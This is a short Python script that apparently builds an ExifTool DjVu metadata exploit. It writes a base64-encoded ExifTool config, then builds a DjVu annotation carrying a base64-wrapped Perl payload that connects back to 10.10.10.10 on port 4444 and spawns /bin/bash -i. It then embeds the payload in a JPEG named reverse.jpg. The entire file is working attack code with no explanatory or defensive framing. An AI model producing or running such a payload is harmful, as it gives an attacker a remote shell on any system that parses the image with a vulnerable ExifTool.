import os,base64,subprocess

ip = '10.10.10.10'
port = '4444'

os.system("echo 'JUltYWdlOjpFeGlmVG9vbDo6VXNlckRlZmluZWQgPSAoCiAgICAnSW1hZ2U6OkV4aWZUb29sOjpF\neGlmOjpNYWluJyA9PiB7CiAgICAgICAgMHhjNTFiID0+IHsKICAgICAgICAgICAgTmFtZSA9PiAn\nSGFzc2VsYmxhZEV4aWYnLAogICAgICAgICAgICBXcml0YWJsZSA9PiAnc3RyaW5nJywKICAgICAg\nICAgICAgV3JpdGVHcm91cCA9PiAnSUZEMCcsCiAgICAgICAgfSwKICAgIH0sCik7CjE7ICNlbmQK' | base64 -d > config")

payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"

payload = payload + base64.b64encode( f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/bash -i');}};".encode() )

payload = payload + b"'))};\")"

payload_file = open('payload', 'w')
payload_file.write(payload.decode('utf-8'))
payload_file.close()

subprocess.run(['bzz', 'payload', 'payload.bzz'])
subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
subprocess.run(['exiftool', '-config', 'config', '-HasselbladExif<=exploit.djvu', 'reverse.jpg'])
